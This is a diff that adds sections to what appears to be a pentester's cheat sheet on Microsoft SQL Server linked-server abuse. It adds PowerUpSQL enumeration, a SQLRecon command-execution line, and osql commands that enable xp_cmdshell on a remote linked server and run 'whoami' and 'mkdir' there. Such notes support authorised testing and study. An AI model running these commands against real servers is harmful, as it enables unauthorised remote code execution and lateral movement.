@@ -35,6 +35,12 @@ EXEC sp_linkedservers;
 select * from openquery("WEB\CLIENTS", 'SELECT name FROM master..sysdatabases;')
 ```
 
+With `PowerUPSql.ps1`, [CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet).
+
+```
+Get-SQLInstanceLocal -Verbose
+```
+
 
 ## Connect Server link
 
@@ -58,6 +64,19 @@ EXECUTE ('EXEC master..xp_cmdshell ''whoami''') at [SQLSERVER2] ;
 
 ## Using SQLRecon Tools with link
 
+Sometimes SQLRecon.exe have some problem with code execute.
+
 ```
 .\SQLRecon.exe /a:WinToken /h:127.0.0.1 /l:xxx.xxx.local /m:lXpCmd /c:'command'
+
+```
+
+## osql enable cmdshell with link
+
+```
+osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('sp_configure''xp_cmdshell'',1;RECONFIGURE;') AT [<remote.manesec.local>]"
+
+osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('xp_cmdshell whoami') AT [<remote.manesec.local>];"
+osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('xp_cmdshell ''mkdir C:\mane''') AT [<remote.manesec.local>];"
+
 ```
